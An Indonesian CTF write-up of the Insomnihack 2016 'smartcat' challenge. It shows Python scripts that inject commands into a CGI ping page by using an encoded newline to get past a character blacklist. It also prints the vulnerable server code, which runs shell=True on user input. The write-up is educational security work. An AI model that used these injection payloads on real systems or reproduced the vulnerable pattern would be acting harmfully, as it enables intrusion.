Deskripsi soal:

<pre>
Damn it, that stupid smart cat litter is broken again. Now only the debug interface is available ( http://smartcat.insomnihack.ch/cgi-bin/index.cgi )and this stupid thing only permits one ping to be sent! I know my contract number is stored somewhere on that interface but I can't find it and this is the only available page! Please have a look and get this info for me 
FYI: No need to bruteforce anything there. If you do you'll be banned permanently
</pre>

CTF pertama ditahun 2016, soal - soal yang ada pada kompetisi ini cukup menarik, menantang dan juga sulit menurut saya. Mengenai penyelesaian soal, ini hanya satu - satunya soal yang dapat saya jawab, nah jadi disini kita diberikan sebuah situs yang dapat melakukan ping ke suatu host. Ada beberapa vulnerability yang saya pikirkan setelah melihat cara kerja situs ini, yakni vulnerability shellshock dan arbitrary command execution. Hal pertama yang saya lakukan ialah melakukan pengecekan shellshock vulnerability, tetapi ternyata tidak didapat vulnerability tersebut.

Pada vulnerability berikutnya adalah arbitrary command execution, untuk itu saya mencoba melakukan manual testing terlebih dahulu dengan memanfaatkan separator spasi ( termasuk spasi yang diencode (%20) ), semicolon (;), or (||), serta and (&&). Nampaknya tidak berhasil dan memberikan output salah satunya seperti berikut ini "Bad character ; in dest", mungkin karena pengaruh dari sanitasi di aplikasi tersebut. Sedikit susah nampaknya kalau tidak ada source codenya. Maka dari itu saya memutuskan untuk mencoba melakukan beberapa teknik bypass lainnya yaitu dengan memanfaatkan newline character ( \n ) yang diencode berarti menjadi %0a saat diterapkan pada nilai dibagian parameter. Berikut script pythonnya berdasarkan stagenya bisa diperhatikan dari cara kerja kodenya.

```python
import urllib2
import re

class Exploit:
    def __init__(self):
        self.exploit = ""

    def find_flag_stage1(self):
        self.exploit = "127.0.0.1%0Als"
        return self.exploit

class RunExploit:
    def __init__(self):
        self.url = "http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=%s"

    def execute(self, params):
        url =  self.url % (params)
        read_url = urllib2.urlopen(url).read()
        if "INS{" in read_url:
            filtered = re.findall(r'INS{(.*)}', read_url)
            print filtered
        else: print read_url

def main():
    exploit = Exploit()
    deploy = exploit.find_flag_stage1()
    run = RunExploit().execute(deploy)

if __name__ == '__main__':
    main()
```

Ternyata trik tersebut berhasil dan ditemukan file - file berikut ini.
<pre>
index.cgi
there
</pre>

'there' nampaknya cukup menarik, saya belum mengetahui persis apakah itu sebuah file atau direktori. Maka dari itu, saya menambahkan method untuk menjalankan command 'find' di python yang fungsinya untuk melihat bagian / sub bagian didalam working directory.


```python
import urllib2
import re

class Exploit:
    def __init__(self):
        self.exploit = ""

    def find_flag_stage1(self):
        self.exploit = "127.0.0.1%0Als"
        return self.exploit

	def find_flag_stage2(self):
        self.exploit = "127.0.0.1%0Afind"
        return self.exploit

class RunExploit:
    def __init__(self):
        self.url = "http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=%s"

    def execute(self, params):
        url =  self.url % (params)
        read_url = urllib2.urlopen(url).read()
        if "INS{" in read_url:
            filtered = re.findall(r'INS{(.*)}', read_url)
            print filtered
        else: print read_url

def main():
    exploit = Exploit()
    deploy = exploit.find_flag_stage2()
    run = RunExploit().execute(deploy)

if __name__ == '__main__':
    main()
```

Dan berikut hasilnya.

```bash
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag

```

Rupanya 'there' tersebut adalah sebuah direktori dimana pada bagian didalamnya juga terdapat direktori yang lain ( nested directory ), kita sudah mengetahui bahwa bagian terakhir adalah file 'flag' kemungkinan adalah flag yang dimaksud, maka tujuan kita disini berikutnya adalah mencoba menampilkan file flag tersebut.

Namun, sangat disayangkan bahwa saya teringat bahwa spasi difilter dibagian ini, saya tidak dapat menjalankan proses "cat /there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag", bahkan menggunakan encoded string maupun teknik - teknik yang lain masih saja tidak dapat di-bypass dengan harapan dapat membaca file flagnya.

Pengetahuan saya di command linux masih terbatas, masih banyak yang harus saya ketahui, maka dari itu saya mencoba untuk menggali informasi lagi mengenai perintah 'cat' dengan versi yang berbeda tetapi dapat menjalankan dan mengeluarkan hasil yang sama. Dan didapatkanlah situs berikut ini yang saya baca.

http://www.linuxnix.com/20-linuxunix-cat-command-examples/

Disana dijelaskan kita dapat menggunakan perintah 'cat' dengan cara berikut.

```bash
cat < namafile
```

Langsung saja saya menerapkannya di python script yang akan saya lanjuti, namun tanpa menggunakan spasi.

```python
import urllib2
import re

class Exploit:
    def __init__(self):
        self.exploit = ""

    def find_flag_stage1(self):
        self.exploit = "127.0.0.1%0Als"
        return self.exploit

	def find_flag_stage2(self):
        self.exploit = "127.0.0.1%0Afind"
        return self.exploit

	def find_flag_stage3(self):
        self.exploit = "127.0.0.1%0Acat<there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag"
        return self.exploit

class RunExploit:
    def __init__(self):
        self.url = "http://smartcat.insomnihack.ch/cgi-bin/index.cgi?dest=%s"

    def execute(self, params):
        url =  self.url % (params)
        read_url = urllib2.urlopen(url).read()
        if "INS{" in read_url:
            filtered = re.findall(r'INS{(.*)}', read_url)
            print filtered
        else: print read_url

def main():
    exploit = Exploit()
    deploy = exploit.find_flag_stage3()
    run = RunExploit().execute(deploy)

if __name__ == '__main__':
    main()
```

Voila! dan ditemukan flagnya.

Flag: <b>INS{warm_kitty_smelly_kitty_flush_flush_flush}</b>

Oh, mengenai index.cgi untuk melihat filter apa saja yang difilter oleh proses didalam index.cgi, berikut source codenya.

```python
#!/usr/bin/env python

import cgi, subprocess, os

headers = ["mod_cassette_is_back/0.1","format-me-i-im-famous","dirbuster.will.not.help.you","solve_me_already"]

print "X-Powered-By: %s" % headers[os.getpid()%4] 
print "Content-type: text/html"
print

print """
<html>

<head><title>Can I haz Smart Cat ???</title></head>

<body>

  <h3> Smart Cat debugging interface </h3>
"""

blacklist = " $;&|({`\t"
results = ""
form = cgi.FieldStorage()
dest = form.getvalue("dest", "127.0.0.1")
for badchar in blacklist:
    if badchar in dest:
        results = "Bad character %s in dest" % badchar
        break

if "%n" in dest:
    results = "Segmentation fault"

if not results:
    try:
        results = subprocess.check_output("ping -c 1 "+dest, shell=True)
    except:
        results = "Error running " + "ping -c 1 "+dest


print """

  <form method="post" action="index.cgi">
    <p>Ping destination: <input type="text" name="dest"/></p>
  </form>

  <p>Ping results:</p><br/>
  <pre>%s</pre>

  <img src="../img/cat.jpg"/>

</body>

</html>
""" % cgi.escape(results)
```
